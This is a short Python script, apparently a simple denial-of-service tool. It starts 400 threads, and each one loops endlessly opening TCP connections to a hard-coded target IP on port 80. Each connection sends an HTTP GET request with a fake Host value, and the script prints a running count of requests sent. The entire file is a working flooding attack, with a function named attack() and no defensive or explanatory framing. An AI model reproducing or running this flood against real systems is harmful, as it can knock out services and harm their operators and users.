import socket
from threading import Thread

TARGET_IP = "192.168.0.1"
PORT = 80
# This value will show up as the source IP Address in the HTTP header.
# THIS DOES NOT MAKE YOU ANONYMOUS.
FAKE_SRC = "127.0.0.1"
req_count = 0


def attack():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((TARGET_IP, PORT))
        sock.sendto(("GET /" + TARGET_IP + " HTTP/1.1\r\n").encode('ascii'), (TARGET_IP, PORT))
        sock.sendto(("Host: " + FAKE_SRC + "\r\n\r\n").encode('ascii'), (TARGET_IP, PORT))
        
        global req_count
        req_count += 1
        if req_count % 100 == 0:
            print(req_count, "requests sent to", TARGET_IP)

        sock.close()
        
for i in range(400):        
    thread = Thread(target = attack)
    thread.start()